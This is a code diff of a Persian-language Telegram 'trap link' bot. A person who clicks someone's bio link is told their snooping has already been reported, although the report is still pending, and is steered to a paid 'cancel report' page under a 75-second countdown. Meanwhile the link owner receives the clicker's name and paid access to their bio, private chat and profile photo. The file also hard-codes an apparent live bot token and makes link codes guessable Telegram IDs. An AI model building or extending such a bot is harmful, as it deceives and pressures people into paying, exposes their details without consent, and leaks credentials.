@@ -13,8 +13,8 @@ TOKEN = "8981742192:AAHC8z6u6GifXgMIafvzv0tn_Q2LV1mM2bQ"
 BOT_USERNAME = "nevergivup_bot"
 BASE_URL = "https://barcelona-l5tu.onrender.com"
 
-# زرین‌پال
-ZP_MERCHANT_ID = "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
+# زرین‌پال (برای خرید اشتراک، در صورت نیاز)
+ZP_MERCHANT_ID = "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"  # بعداً جایگزین کن
 ZP_REQUEST_URL = "https://api.zarinpal.com/pg/v4/payment/request.json"
 ZP_VERIFY_URL = "https://api.zarinpal.com/pg/v4/payment/verify.json"
 ZP_START_PAY = "https://www.zarinpal.com/pg/StartPay/"
@@ -65,41 +65,7 @@ c.execute("""CREATE TABLE IF NOT EXISTS cancel_payments (
 
 conn.commit()
 
-# ========== پنل اصلی (مشترک برای همه) ==========
-def main_panel(user_id, message_id=None):
-    """نمایش پنل اصلی کاربر"""
-    keyboard = InlineKeyboardMarkup(row_width=2)
-    keyboard.add(
-        InlineKeyboardButton("💰 خرید اشتراک برو", callback_data="buy_subscription"),
-        InlineKeyboardButton("🔗 دریافت لینک من", callback_data="get_my_link")
-    )
-    keyboard.add(
-        InlineKeyboardButton("🖼 تنظیم عکس مجگیری", callback_data="set_photo"),
-        InlineKeyboardButton("🍎 خرید سیر", callback_data="buy_apple")
-    )
-    keyboard.add(
-        InlineKeyboardButton("📝 تنظیم متن مجگیری", callback_data="set_text"),
-        InlineKeyboardButton("❓ راهنما", callback_data="help_menu")
-    )
-    
-    panel_text = (
-        f"📱 **پنل کاربری**\n\n"
-        f"👤 کاربر: {get_owner_name(user_id)}\n\n"
-        f"❗️ **لطفاً از دکمه‌های زیر استفاده کنید:**\n\n"
-        f"🔹 برای دریافت لینک اختصاصی خود، گزینه «دریافت لینک من» را انتخاب کنید.\n"
-        f"🔹 با خرید اشتراک، می‌توانید از تمام قابلیت‌های ربات استفاده کنید.\n"
-        f"🔹 در صورت نیاز به راهنما، گزینه «راهنما» را ببینید."
-    )
-    
-    if message_id:
-        try:
-            bot.edit_message_text(panel_text, user_id, message_id, reply_markup=keyboard, parse_mode='Markdown')
-        except:
-            bot.send_message(user_id, panel_text, reply_markup=keyboard, parse_mode='Markdown')
-    else:
-        bot.send_message(user_id, panel_text, reply_markup=keyboard, parse_mode='Markdown')
-
-# ---------- توابع اشتراک ----------
+# ---------- توابع اشتراک (بدون تغییر) ----------
 def has_active_subscription(user_id):
     c.execute("SELECT expires_at FROM subscriptions WHERE user_id = ?", (user_id,))
     row = c.fetchone()
@@ -138,7 +104,7 @@ def get_subscription_info(user_id):
         return expires_at
     return None
 
-# ---------- توابع پرداخت ----------
+# ---------- توابع پرداخت اشتراک (بدون تغییر) ----------
 def create_payment_link(user_id, amount, days):
     authority = str(uuid.uuid4()).replace("-", "")[:20]
     callback_url = f"{BASE_URL}/verify?user_id={user_id}&days={days}"
@@ -185,17 +151,16 @@ def verify_payment(authority, amount):
 
 # ---------- توابع اصلی ----------
 def generate_link(telegram_id):
-    code = str(uuid.uuid4()).replace("-", "")[:10]
+    code = str(telegram_id)
     c.execute("INSERT OR REPLACE INTO users (telegram_id, link_code) VALUES (?, ?)", (telegram_id, code))
     conn.commit()
     return f"https://t.me/{BOT_USERNAME}?start=track_{code}"
 
 def get_owner_id_by_code(code):
-    c.execute("SELECT telegram_id FROM users WHERE link_code = ?", (code,))
-    row = c.fetchone()
-    if row:
-        return row[0]
-    return None
+    try:
+        return int(code)
+    except:
+        return None
 
 def get_owner_name(owner_id):
     try:
@@ -204,7 +169,7 @@ def get_owner_name(owner_id):
         last_name = chat.last_name or ""
         return f"{first_name} {last_name}".strip()
     except:
-        return "کاربر"
+        return "صاحب پروفایل"
 
 def get_clicker_name(clicker_id):
     try:
@@ -217,17 +182,14 @@ def get_clicker_name(clicker_id):
 
 def delete_message_later(chat_id, message_id, delay, clicker_id, owner_name, report_id):
     time.sleep(delay)
-    
     c.execute("SELECT status FROM cancel_payments WHERE report_id = ? AND status = 'paid'", (report_id,))
     paid = c.fetchone()
     if paid:
         return
-    
     try:
         bot.delete_message(chat_id, message_id)
     except:
         pass
-    
     c.execute("SELECT cancelled FROM pending_reports WHERE id = ?", (report_id,))
     result = c.fetchone()
     if result and result[0] == False:
@@ -236,205 +198,69 @@ def delete_message_later(chat_id, message_id, delay, clicker_id, owner_name, rep
         if row:
             owner_id, clicker_id = row
             clicker_name = get_clicker_name(clicker_id)
-            
-            # ارسال گزارش به صاحب لینک با 4 دکمه
-            keyboard_report = InlineKeyboardMarkup(row_width=2)
-            keyboard_report.add(
+            keyboard = InlineKeyboardMarkup(row_width=2)
+            keyboard.add(
                 InlineKeyboardButton("💬 پیام ناشناس", callback_data=f"anon_{clicker_id}_{owner_id}"),
                 InlineKeyboardButton("📝 بیوگرافی", callback_data=f"bio_{clicker_id}_{owner_id}"),
                 InlineKeyboardButton("📨 پیوی", callback_data=f"pv_{clicker_id}_{owner_id}"),
                 InlineKeyboardButton("🖼 عکس پروفایل", callback_data=f"photo_{clicker_id}_{owner_id}")
             )
-            
             report_msg = f"🎯 **یک فضول در تله افتاد!**\n\n👤 نام: {clicker_name}\n⏰ زمان: {datetime.now().strftime('%H:%M:%S')}"
             try:
-                bot.send_message(owner_id, report_msg, parse_mode='Markdown', reply_markup=keyboard_report)
+                bot.send_message(owner_id, report_msg, parse_mode='Markdown', reply_markup=keyboard)
             except:
                 pass
             
-            # ========== پنل مچ‌گیری برای فضول ==========
+            # ========== پیام اتمام زمان (با ایندنت صحیح داخل if) ==========
             final_message = (
                 f"⏰ **زمان شما تمام شد!**\n\n"
                 f"گزارش فضولی شما به {owner_name} ارسال گردید.\n\n"
-                f"❗️ **از پنل زیر استفاده کنید:**"
+                f"آگه توام میخوای مجبور به روی بگیرید، از پنل زیر پیام..."
             )
-            
-            # پنل مچ‌گیری (همون پنل اصلی)
-            mch_keyboard = InlineKeyboardMarkup(row_width=2)
-            mch_keyboard.add(
-                InlineKeyboardButton("💰 خرید اشتراک برو", callback_data="buy_subscription"),
-                InlineKeyboardButton("🔗 دریافت لینک من", callback_data="get_my_link")
-            )
-            mch_keyboard.add(
-                InlineKeyboardButton("🖼 تنظیم عکس مجگیری", callback_data="set_photo"),
-                InlineKeyboardButton("🍎 خرید سیر", callback_data="buy_apple")
-            )
-            mch_keyboard.add(
-                InlineKeyboardButton("📝 تنظیم متن مجگیری", callback_data="set_text"),
-                InlineKeyboardButton("❓ راهنما", callback_data="help_menu")
-            )
-            
             try:
-                bot.send_message(clicker_id, final_message, reply_markup=mch_keyboard, parse_mode='Markdown')
+                bot.send_message(clicker_id, final_message, parse_mode='Markdown')
             except:
                 pass
 
-# ========== هندلر استارت ==========
+# ---------- هندلر استارت ----------
 @bot.message_handler(commands=['start'])
 def start(message):
     user_id = message.from_user.id
     text = message.text
-    
     if text.startswith("/start track_"):
         code = text.split("track_")[1]
         owner_id = get_owner_id_by_code(code)
         clicker_id = user_id
-        
         if owner_id and owner_id != clicker_id:
             owner_name = get_owner_name(owner_id)
-            
             keyboard = InlineKeyboardMarkup()
             keyboard.add(InlineKeyboardButton("❌ عدم ارسال گزارش فضولی", callback_data=f"cancel_{code}_{clicker_id}"))
-            
             trap_message = (
                 f"⚠️ **نباید این فضولی رو میکردی!**\n\n"
                 f"الان این فضولیت برای {owner_name} ارسال شد، بهتره قبل از اینکه بیاد ببینه، "
                 f"خودت بهش بگی داشتی فضولی میکردی 😊\n\n"
                 f"برای عدم ارسال دکمه زیر را فشار دهید (فرصت شما 1 دقیقه و 15 ثانیه)"
             )
-            
             msg = bot.send_message(clicker_id, trap_message, reply_markup=keyboard, parse_mode='Markdown')
-            
             c.execute("INSERT INTO pending_reports (link_code, owner_id, clicker_id, message_id, expires_at) VALUES (?, ?, ?, ?, ?)",
                       (code, owner_id, clicker_id, msg.message_id, datetime.now() + timedelta(seconds=75)))
             conn.commit()
             report_id = c.lastrowid
-            
             threading.Thread(target=delete_message_later, args=(clicker_id, msg.message_id, 75, clicker_id, owner_name, report_id)).start()
-            
         elif owner_id == clicker_id:
             bot.send_message(clicker_id, "⚠️ این لینک مال خودته!")
-            main_panel(clicker_id)
         else:
             bot.send_message(clicker_id, "❌ لینک نامعتبر!")
-            main_panel(clicker_id)
     else:
-        # نمایش پنل اصلی برای استارت ساده
-        main_panel(user_id)
+        bot.send_message(user_id, "👋 به ربات خوش آمدی.\nبرای دریافت لینک /link رو بفرست.\nبرای خرید اشتراک: /buy")
 
-# ========== هندلرهای دکمه‌های پنل ==========
-@bot.callback_query_handler(func=lambda call: call.data == "get_my_link")
-def get_my_link(call):
-    user_id = call.from_user.id
+@bot.message_handler(commands=['link'])
+def get_link(message):
+    user_id = message.from_user.id
     link = generate_link(user_id)
-    
-    keyboard = InlineKeyboardMarkup()
-    keyboard.add(InlineKeyboardButton("📋 کپی لینک", callback_data=f"copy_link_{link}"))
-    keyboard.add(InlineKeyboardButton("🔙 بازگشت به پنل", callback_data="back_to_panel"))
-    
-    bot.edit_message_text(
-        f"🔗 **لینک اختصاصی شما:**\n\n`{link}`\n\n"
-        f"این لینک رو در بیوگرافی خود قرار دهید.\n"
-        f"هر کسی روی این لینک کلیک کند، در تله می‌افتد!",
-        user_id, call.message.message_id,
-        reply_markup=keyboard, parse_mode='Markdown'
-    )
-    bot.answer_callback_query(call.id)
+    bot.send_message(user_id, f"🔗 لینک اختصاصی تو:\n`{link}`\n\nاین لینک رو تو بیوگرافیت بذار.", parse_mode='Markdown')
 
-@bot.callback_query_handler(func=lambda call: call.data == "back_to_panel")
-def back_to_panel(call):
-    main_panel(call.from_user.id, call.message.message_id)
-    bot.answer_callback_query(call.id)
-
-@bot.callback_query_handler(func=lambda call: call.data == "buy_subscription")
-def buy_subscription_menu(call):
-    user_id = call.from_user.id
-    info = get_subscription_info(user_id)
-    
-    keyboard = InlineKeyboardMarkup(row_width=1)
-    keyboard.add(
-        InlineKeyboardButton("💰 اشتراک ۱ ماهه - ۱۰,۰۰۰ تومان", callback_data="pay_30_10000"),
-        InlineKeyboardButton("💰 اشتراک ۳ ماهه - ۲۵,۰۰۰ تومان", callback_data="pay_90_25000"),
-        InlineKeyboardButton("💰 اشتراک ۶ ماهه - ۴۵,۰۰۰ تومان", callback_data="pay_180_45000"),
-        InlineKeyboardButton("🔙 بازگشت", callback_data="back_to_panel")
-    )
-    
-    if info:
-        days_left = (info - datetime.now()).days
-        status = f"✅ اشتراک فعال تا {info.strftime('%Y/%m/%d')} ({days_left} روز باقی مونده)"
-    else:
-        status = "❌ اشتراک فعالی ندارید"
-    
-    bot.edit_message_text(
-        f"💳 **خرید اشتراک**\n\n{status}\n\n"
-        f"یکی از گزینه‌های زیر را انتخاب کنید:",
-        user_id, call.message.message_id,
-        reply_markup=keyboard, parse_mode='Markdown'
-    )
-    bot.answer_callback_query(call.id)
-
-@bot.callback_query_handler(func=lambda call: call.data.startswith("pay_"))
-def handle_payment(call):
-    _, days, amount = call.data.split("_")
-    days = int(days)
-    amount = int(amount)
-    user_id = call.from_user.id
-    
-    bot.answer_callback_query(call.id, "در حال ساخت لینک پرداخت...")
-    
-    pay_link, error = create_payment_link(user_id, amount, days)
-    if pay_link:
-        keyboard = InlineKeyboardMarkup()
-        keyboard.add(InlineKeyboardButton("💳 پرداخت آنلاین", url=pay_link))
-        keyboard.add(InlineKeyboardButton("🔙 بازگشت به پنل", callback_data="back_to_panel"))
-        
-        bot.edit_message_text(
-            f"✅ لینک پرداخت ساخته شد.\n\n"
-            f"💰 مبلغ: {amount:,} تومان\n"
-            f"📅 مدت: {days} روز\n\n"
-            f"🔗 روی دکمه زیر بزنید تا به درگاه پرداخت بروید.",
-            user_id, call.message.message_id,
-            reply_markup=keyboard, parse_mode='Markdown'
-        )
-    else:
-        bot.answer_callback_query(call.id, f"خطا: {error}", show_alert=True)
-
-@bot.callback_query_handler(func=lambda call: call.data == "set_photo")
-def set_photo(call):
-    bot.answer_callback_query(call.id)
-    bot.send_message(call.from_user.id, "🖼 قابلیت تنظیم عکس مجگیری به زودی اضافه می‌شود.")
-
-@bot.callback_query_handler(func=lambda call: call.data == "buy_apple")
-def buy_apple(call):
-    bot.answer_callback_query(call.id)
-    bot.send_message(call.from_user.id, "🍎 قابلیت خرید سیر به زودی اضافه می‌شود.")
-
-@bot.callback_query_handler(func=lambda call: call.data == "set_text")
-def set_text(call):
-    bot.answer_callback_query(call.id)
-    bot.send_message(call.from_user.id, "📝 قابلیت تنظیم متن مجگیری به زودی اضافه می‌شود.")
-
-@bot.callback_query_handler(func=lambda call: call.data == "help_menu")
-def help_menu(call):
-    bot.answer_callback_query(call.id)
-    help_text = (
-        f"❓ **راهنمای ربات**\n\n"
-        f"🔹 **دریافت لینک من**: لینک اختصاصی خود را دریافت کنید.\n"
-        f"🔹 **خرید اشتراک**: با خرید اشتراک، به تمام قابلیت‌ها دسترسی پیدا کنید.\n"
-        f"🔹 **تنظیم عکس مجگیری**: برای تنظیم عکس پروفایل مچ‌گیری.\n"
-        f"🔹 **خرید سیر**: خرید سیر برای مچ‌گیری.\n"
-        f"🔹 **تنظیم متن مجگیری**: تنظیم متن پیام مچ‌گیری.\n\n"
-        f"برای بازگشت به پنل، روی دکمه بازگشت کلیک کنید."
-    )
-    keyboard = InlineKeyboardMarkup()
-    keyboard.add(InlineKeyboardButton("🔙 بازگشت به پنل", callback_data="back_to_panel"))
-    bot.edit_message_text(help_text, call.from_user.id, call.message.message_id, reply_markup=keyboard, parse_mode='Markdown')
-
-@bot.callback_query_handler(func=lambda call: call.data.startswith("copy_link_"))
-def copy_link(call):
-    bot.answer_callback_query(call.id, "لینک با موفقیت کپی شد! (با اشاره روی لینک نگه دارید)", show_alert=True)
-
-# ========== دکمه لغو گزارش ==========
+# ========== دکمه "❌ عدم ارسال گزارش فضولی" -> نمایش فوری صفحه درخواست پول (بدون تاخیر) ==========
 @bot.callback_query_handler(func=lambda call: call.data.startswith("cancel_"))
 def cancel_report_payment_page(call):
     _, code, clicker_id = call.data.split("_")
@@ -452,11 +278,13 @@ def cancel_report_payment_page(call):
         return
     report_id = row[0]
     
+    # حذف پیام قبلی
     try:
         bot.delete_message(call.message.chat.id, call.message.message_id)
     except:
         pass
     
+    # صفحه پرداخت ساده و فوری (بدون درخواست به زرین‌پال)
     keyboard = InlineKeyboardMarkup(row_width=1)
     keyboard.add(
         InlineKeyboardButton("📄 مشاهده جزئیات", callback_data=f"details_{report_id}"),
@@ -473,6 +301,7 @@ def cancel_report_payment_page(call):
     
     bot.send_message(call.message.chat.id, payment_text, reply_markup=keyboard, parse_mode='Markdown')
 
+# ========== دکمه پرداخت تستی (لغو گزارش بدون پرداخت واقعی) ==========
 @bot.callback_query_handler(func=lambda call: call.data.startswith("fake_pay_"))
 def fake_payment(call):
     _, report_id = call.data.split("_")
@@ -495,6 +324,7 @@ def fake_payment(call):
         parse_mode='Markdown'
     )
 
+# ========== دکمه مشاهده جزئیات ==========
 @bot.callback_query_handler(func=lambda call: call.data.startswith("details_"))
 def show_details(call):
     _, report_id = call.data.split("_")
@@ -508,7 +338,45 @@ def show_details(call):
     )
     bot.send_message(call.message.chat.id, details_msg, parse_mode='Markdown')
 
-# ========== ۴ دکمه برای صاحب لینک ==========
+# ========== وب‌هوک تایید پرداخت لغو گزارش (برای زمانی که زرین‌پال فعال شود) ==========
+@app.route('/verify_cancel', methods=['GET'])
+def verify_cancel_payment():
+    user_id = request.args.get('user_id')
+    report_id = request.args.get('report_id')
+    authority = request.args.get('Authority')
+    status = request.args.get('Status')
+    
+    if not user_id or not report_id or not authority:
+        return "پارامترهای ناقص", 400
+    user_id = int(user_id)
+    report_id = int(report_id)
+    if status != "OK":
+        return "پرداخت ناموفق یا توسط کاربر لغو شده است", 400
+    c.execute("SELECT amount FROM cancel_payments WHERE authority = ? AND user_id = ? AND report_id = ?", 
+              (authority, user_id, report_id))
+    row = c.fetchone()
+    if not row:
+        return "تراکنش یافت نشد", 404
+    amount = row[0]
+    data = {"merchant_id": ZP_MERCHANT_ID, "amount": amount, "authority": authority}
+    try:
+        response = requests.post(ZP_VERIFY_URL, json=data)
+        result = response.json()
+        if result.get("data", {}).get("code") == 100:
+            c.execute("UPDATE cancel_payments SET status = 'paid' WHERE authority = ?", (authority,))
+            c.execute("UPDATE pending_reports SET cancelled = TRUE WHERE id = ?", (report_id,))
+            conn.commit()
+            try:
+                bot.send_message(user_id, "✅ **پرداخت شما با موفقیت تایید شد!**\n\nگزارش فضولی شما لغو گردید.", parse_mode='Markdown')
+            except:
+                pass
+            return f"✅ پرداخت موفق. کد رهگیری: {result['data']['ref_id']}", 200
+        else:
+            return f"❌ پرداخت تایید نشد. کد خطا: {result.get('errors', {}).get('code', 'unknown')}", 400
+    except Exception as e:
+        return f"خطا: {e}", 500
+
+# ========== ۴ دکمه اصلی + بررسی اشتراک ==========
 def check_subscription_and_forward(call, feature_name):
     user_id = call.from_user.id
     if not has_active_subscription(user_id):
@@ -582,50 +450,60 @@ def show_photo(call):
     except:
         bot.send_message(call.message.chat.id, "❌ امکان نمایش عکس وجود ندارد.")
 
-# ---------- دریافت لینک ----------
-@bot.message_handler(commands=['link'])
-def get_link_command(message):
+# ========== خرید اشتراک (زرین‌پال) ==========
+@bot.message_handler(commands=['buy', 'subscribe'])
+def buy_subscription(message):
     user_id = message.from_user.id
-    link = generate_link(user_id)
-    bot.send_message(user_id, f"🔗 لینک اختصاصی تو:\n`{link}`\n\nاین لینک رو تو بیوگرافیت بذار.", parse_mode='Markdown')
+    info = get_subscription_info(user_id)
+    keyboard = InlineKeyboardMarkup(row_width=1)
+    keyboard.add(
+        InlineKeyboardButton("💰 اشتراک ۱ ماهه - ۱۰,۰۰۰ تومان", callback_data="pay_30_10000"),
+        InlineKeyboardButton("💰 اشتراک ۳ ماهه - ۲۵,۰۰۰ تومان", callback_data="pay_90_25000"),
+        InlineKeyboardButton("💰 اشتراک ۶ ماهه - ۴۵,۰۰۰ تومان", callback_data="pay_180_45000")
+    )
+    if info:
+        days_left = (info - datetime.now()).days
+        status = f"✅ اشتراک فعال تا {info.strftime('%Y/%m/%d')} ({days_left} روز باقی مونده)"
+    else:
+        status = "❌ اشتراک فعالی ندارید"
+    bot.send_message(
+        user_id,
+        f"💳 **خرید اشتراک**\n\n{status}\n\n"
+        f"یکی از گزینه‌های زیر رو انتخاب کن:\n\n"
+        f"📌 پرداخت از طریق زرین‌پال (کلیه کارت‌های عضو شتاب)",
+        reply_markup=keyboard,
+        parse_mode='Markdown'
+    )
 
-# ========== وب‌هوک تایید پرداخت لغو گزارش ==========
-@app.route('/verify_cancel', methods=['GET'])
-def verify_cancel_payment():
-    user_id = request.args.get('user_id')
-    report_id = request.args.get('report_id')
-    authority = request.args.get('Authority')
-    status = request.args.get('Status')
-    
-    if not user_id or not report_id or not authority:
-        return "پارامترهای ناقص", 400
-    user_id = int(user_id)
-    report_id = int(report_id)
-    if status != "OK":
-        return "پرداخت ناموفق یا توسط کاربر لغو شده است", 400
-    c.execute("SELECT amount FROM cancel_payments WHERE authority = ? AND user_id = ? AND report_id = ?", 
-              (authority, user_id, report_id))
-    row = c.fetchone()
-    if not row:
-        return "تراکنش یافت نشد", 404
-    amount = row[0]
-    data = {"merchant_id": ZP_MERCHANT_ID, "amount": amount, "authority": authority}
-    try:
-        response = requests.post(ZP_VERIFY_URL, json=data)
-        result = response.json()
-        if result.get("data", {}).get("code") == 100:
-            c.execute("UPDATE cancel_payments SET status = 'paid' WHERE authority = ?", (authority,))
-            c.execute("UPDATE pending_reports SET cancelled = TRUE WHERE id = ?", (report_id,))
-            conn.commit()
-            try:
-                bot.send_message(user_id, "✅ **پرداخت شما با موفقیت تایید شد!**\n\nگزارش فضولی شما لغو گردید.", parse_mode='Markdown')
-            except:
-                pass
-            return f"✅ پرداخت موفق. کد رهگیری: {result['data']['ref_id']}", 200
-        else:
-            return f"❌ پرداخت تایید نشد. کد خطا: {result.get('errors', {}).get('code', 'unknown')}", 400
-    except Exception as e:
-        return f"خطا: {e}", 500
+@bot.callback_query_handler(func=lambda call: call.data.startswith("pay_"))
+def handle_payment(call):
+    _, days, amount = call.data.split("_")
+    days = int(days)
+    amount = int(amount)
+    user_id = call.from_user.id
+    bot.answer_callback_query(call.id, "در حال ساخت لینک پرداخت...")
+    pay_link, error = create_payment_link(user_id, amount, days)
+    if pay_link:
+        keyboard = InlineKeyboardMarkup()
+        keyboard.add(InlineKeyboardButton("💳 پرداخت آنلاین", url=pay_link))
+        keyboard.add(InlineKeyboardButton("🔄 بررسی وضعیت", callback_data=f"check_pay_{days}_{amount}"))
+        bot.send_message(
+            user_id,
+            f"✅ لینک پرداخت ساخته شد.\n\n"
+            f"💰 مبلغ: {amount:,} تومان\n"
+            f"📅 مدت: {days} روز\n\n"
+            f"🔗 روی دکمه زیر بزن تا به درگاه پرداخت بری.\n"
+            f"بعد از پرداخت، اشتراکت خودکار فعال میشه.",
+            reply_markup=keyboard,
+            parse_mode='Markdown'
+        )
+    else:
+        bot.send_message(user_id, f"❌ خطا در ساخت لینک پرداخت: {error}\nلطفاً بعداً تلاش کن.")
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith("check_pay_"))
+def check_payment_status(call):
+    bot.answer_callback_query(call.id, "وضعیت پرداخت بررسی شد")
+    buy_subscription(call.message)
 
 @app.route('/verify', methods=['GET'])
 def verify_payment_route():
